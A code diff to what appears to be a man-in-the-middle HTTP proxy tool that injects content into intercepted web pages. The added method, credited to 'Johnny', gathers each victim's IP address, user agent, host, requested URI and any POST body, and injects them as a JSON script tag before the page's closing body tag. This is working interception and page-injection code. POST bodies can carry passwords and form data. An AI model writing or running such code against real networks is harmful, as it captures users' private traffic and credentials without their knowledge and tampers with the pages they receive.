@@ -16,7 +16,7 @@
 # USA
 #
 
-import logging, re, string, random, zlib, gzip, StringIO, os
+import logging, re, string, random, zlib, gzip, StringIO, os, json, socket
 
 import sys
 import time
@@ -107,7 +107,12 @@ class ServerConnection(HTTPClient):
         if '</body>' in data:
             print "body in data found, injecting..."
             cbindex = data.index('</body>')
+
+            # Plus feature by Johnny, add connection information to a JSON-Script tag
+            fullinject = fullinject + self.getConnectionInfoAsJSONScript(clientip)
+
             retval = data[:cbindex] + fullinject + data[cbindex:]
+
             return retval
         elif '<script' not in fullinject:
             return data + fullinject
@@ -121,6 +126,21 @@ class ServerConnection(HTTPClient):
 
     def getPostPrefix(self):
         return "POST"
+
+    def getConnectionInfoAsJSONScript(self, clientip):
+        retVal = '<script type="application/json" id="mitm-scraper-conn-info">'
+        d = {}
+        d['IP'] = clientip
+        #d['Hostname'] = socket.gethostbyaddr(clientip)
+        d['UAgent'] = self.headers['user-agent']
+        d['Method'] = self.command
+        d['Host'] = self.headers['host']
+        d['URI'] = self.uri
+        if self.postData:
+            d['POST'] = self.postData
+        d['Date'] = time.time()
+
+        return retVal + json.dumps(d) + '</script>'
 
     def sendRequest(self):
         logging.log(self.getLogLevel(), "Sending Request: %s %s"  % (self.command, self.uri))
